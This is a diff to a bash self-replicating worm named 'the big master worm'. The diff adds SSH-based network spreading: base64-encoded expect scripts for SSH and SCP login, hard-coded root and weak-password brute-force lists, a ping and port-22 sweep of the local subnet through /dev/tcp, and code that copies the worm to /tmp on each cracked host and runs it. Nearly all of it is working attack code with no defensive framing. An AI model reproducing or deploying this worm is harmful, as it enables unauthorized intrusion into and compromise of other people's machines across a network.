@@ -12,7 +12,7 @@ infect_line=4
 infect_max_num=4
 infect_num=0
 infect_func_num=2
-infect_self_num=3
+infect_self_num=5
 infect_self_name=""
 infect_key_words="the big master worm."
 
@@ -69,15 +69,135 @@ bmw_extract_body()
         shellcode=`awk -v phase_start="$2" -v phase_end="$3" 'BEGIN {phase_flag=0;phase_len=0}{if (phase_flag == 1) {phase_array[phase_len]=$0;phase_len++}if ($0 ~ phase_start) {phase_flag=1;phase_array[phase_len]=$0;phase_len++}if ($0 ~ phase_end) {phase_flag=0;}}END {for (i = 0; i < phase_len; i++) print phase_array[i]}' $1`
 
 	shellcode1=$(echo "$shellcode"|sed 's/\\/\\\\/g')
-	newcode=`awk -v scode="$shellcode1" -v tnum="$5" 'BEGIN {func_flag=0;func_num=0}	{if (func_flag == 1) {print $0;	if ($0 ~ /^\}/) {func_flag=0;print scode}}else {if ($0 ~ /^[[:alnum:]].*\(\)/) {func_num++;if (func_num == tnum) {func_flag=1;}}print $0}}' $4`
+	newcode=`awk -v scode="$shellcode1" -v tnum="$5" 'BEGIN {func_flag=0;func_num=0}{if (func_flag == 1) {print $0;	if ($0 ~ /^\}/) {func_flag=0;print scode}}else {if ($0 ~ /^[[:alnum:]].*\(\)/) {func_num++;if (func_num == tnum) {func_flag=1;}}print $0}}' $4`
 
-	#echo -e "$newcode" >$4.bak
 	echo -e "$newcode"|sed 's/\\/\\\\/g' >$4.bak
 	rm -f $4 && mv $4.bak $4
 	chmod +x $4
 }
 # bmw_phase2_end
 
-# bmw_phase3_start
-bmw_find_scripts $0
-# bmw_phase3_end
+ssh_crack_exp="IyEvdXNyL2Jpbi9leHBlY3QKCnNldCBJUCBbbGluZGV4ICRhcmd2IDBdCnNldCBVU0VSIFtsaW5k
+ZXggJGFyZ3YgMV0Kc2V0IFBBU1NXRCBbbGluZGV4ICRhcmd2IDJdCnNldCBDTUQgW2xpbmRleCAk
+YXJndiAzXQpzZXQgVElNRU9VVCBbbGluZGV4ICRhcmd2IDRdCnNldCB0aW1lb3V0IFtsaW5kZXgg
+JGFyZ3YgNF0KCnNwYXduIC1ub2VjaG8gc3NoIC1vIFNlcnZlckFsaXZlSW50ZXJ2YWw9JFRJTUVP
+VVQgLW8gQ29ubmVjdFRpbWVvdXQ9JFRJTUVPVVQgLXQgJFVTRVJAJElQICRDTUQKZXhwZWN0IHsK
+CSIoeWVzL25vKSIgeyBzZW5kICJ5ZXNcciI7IGV4cF9jb250aW51ZSB9CgkiKmFzc3dvcmQ6IiB7
+IHNlbmQgIiRQQVNTV0RcciIgfQoJIlBhc3N3b3JkIGZvciIgeyBzZW5kICIkUEFTU1dEXHIiIH0K
+CSJOYW1lIG9yIHNlcnZpY2Ugbm90IGtub3duIiB7IGV4aXQgMX0KCSJObyByb3V0ZSB0byBob3N0
+IiB7IGV4aXQgMiB9CgkiQ29ubmVjdGlvbiByZWZ1c2VkIiB7IGV4aXQgOSB9CgkiTGFzdCBsb2dp
+bjoiIHsgZXhpdCAzfQoJdGltZW91dCB7IGV4aXQgNCB9Cgllb2YgeyBleGl0IDAgfQp9CgpleHBl
+Y3QgewogICAgICAgICIqYXNzd29yZDoiIHsgZXhpdCA1IH0KCSJQYXNzd29yZCBmb3IiIHsgZXhp
+dCA4IH0KICAgICAgICAidWlkPSIgeyBleGl0IDYgfQogICAgICAgIGVvZiB7IGV4aXQgNyB9Cn0K"
+
+scp_crack_exp="IyEvdXNyL2Jpbi9leHBlY3QKCnNldCBJUCBbbGluZGV4ICRhcmd2IDJdCnNldCBVU0VSIFtsaW5k
+ZXggJGFyZ3YgMV0Kc2V0IFBBU1NXRCBbbGluZGV4ICRhcmd2IDVdCnNldCBMT0NBTF9GSUxFIFts
+aW5kZXggJGFyZ3YgMF0Kc2V0IFRJTUVPVVQgW2xpbmRleCAkYXJndiA0XQpzZXQgdGltZW91dCBb
+bGluZGV4ICRhcmd2IDRdCnNldCBSRU1PVEVfUEFUSCBbbGluZGV4ICRhcmd2IDNdCgpzcGF3biBz
+Y3AgLW8gU2VydmVyQWxpdmVJbnRlcnZhbD0kVElNRU9VVCAtbyBDb25uZWN0VGltZW91dD0kVElN
+RU9VVCAgJExPQ0FMX0ZJTEUgJFVTRVJAJElQOiRSRU1PVEVfUEFUSApleHBlY3QgewoJIih5ZXMv
+bm8pIiB7IHNlbmQgInllc1xyIjsgZXhwX2NvbnRpbnVlIH0KCSIqYXNzd29yZDoiIHsgc2VuZCAi
+JFBBU1NXRFxyIiB9CgkiUGFzc3dvcmQgZm9yIiB7IHNlbmQgIiRQQVNTV0RcciIgfQoJIk5hbWUg
+b3Igc2VydmljZSBub3Qga25vd24iIHsgZXhpdCAxfQoJIk5vIHJvdXRlIHRvIGhvc3QiIHsgZXhp
+dCAyIH0KCSJDb25uZWN0aW9uIHJlZnVzZWQiIHsgZXhpdCA5IH0KCSJMYXN0IGxvZ2luOiIgeyBl
+eGl0IDN9Cgl0aW1lb3V0IHsgZXhpdCA0IH0KCWVvZiB7IGV4aXQgMCB9Cn0KCmV4cGVjdCB7CiAg
+ICAgICAgIiphc3N3b3JkOiIgeyBleGl0IDUgfQoJIlBhc3N3b3JkIGZvciIgeyBleGl0IDggfQog
+ICAgICAgIGVvZiB7IGV4aXQgMCB9Cn0K"
+
+ssh_crack_user=("root" "wzt")
+ssh_crack_passwd=("123456" "111" "giveshell" "afafa" "afafdfafdf")
+
+bmw_socket_create()
+{
+        exec 1024<> /dev/tcp/$1/$2
+        [ $? -eq 0 ] && echo "connect to $1:$2 ok." || echo "connect to $1:$2 failed."
+}
+
+bmw_socket_close()
+{
+        exec >&1024-
+        [ $? -ne 0 ] && echo "close socket failed."
+}
+
+bmw_ssh_copy_file()
+{
+	./scp_crack.exp $2 $user $1 "/tmp" 4 $passwd
+	[ $? -ne 0 ] && return
+	./ssh_crack.exp $1 $user $passwd "cd /tmp;$2" 4
+}
+
+bmw_ssh_crack()
+{
+	local user passwd
+
+	for user in ${ssh_crack_user[*]}
+	do
+		for passwd in ${ssh_crack_passwd[*]}
+		do
+			./ssh_crack.exp $1 $user $passwd "" 4
+			if [ $? -eq 0 ]; then
+				echo -ne "\ttrying $user => $passwd\t[success]\n"
+				bmw_ssh_copy_file $1 $2 $user $passwd
+				return 
+			else
+				echo -ne "\ttrying $user => $passwd\t[failed]\r"
+			fi
+		done
+	done
+}
+
+bmw_crack_init()
+{
+	local bin old_ifs flag=0
+
+	old_ifs=$IFS; IFS=':'
+	for bin in $PATH
+	do
+		[ -f $bin/expect ] && flag=1
+	done
+	IFS=$old_ifs
+
+	[ $flag -ne 1 ] && return 1
+
+	echo "$ssh_crack_exp"|base64 -d >ssh_crack.exp
+	[ -f ssh_crack.exp ] && chmod +x ssh_crack.exp
+
+	echo "$scp_crack_exp"|base64 -d >scp_crack.exp
+	[ -f scp_crack.exp ] && chmod +x scp_crack.exp
+	return 0
+}
+
+bmw_infect_net()
+{
+	local local_ip host ip
+
+	local_ip=`env|grep -i SSH_CONNECTION|awk '{print $3}'`
+	host=`echo $local_ip|cut -d '.' -f 1-3`
+
+	bmw_crack_init
+	[ $? -eq 1 ] && return 1
+
+	for ((i = 1; i <= 254; i++))
+	do
+		ip="$host.$i"
+		echo -e "ping $ip"
+
+		[ "$local_ip" == "$ip" ] && continue
+
+		ping -W 1 -c 1 $ip >/dev/null
+		[ $? -eq 1 ] && continue
+
+		exec 254<> /dev/tcp/$ip/22
+		[ $? -ne 0 ] && continue
+		echo "$ip port 22 is open."
+		exec 254<&-; exec 254>&- 
+
+		bmw_ssh_crack "$ip" $1
+	done
+
+}
+
+# bmw_phase5_start
+#bmw_find_scripts $0
+bmw_infect_net $0
+# bmw_phase5_end
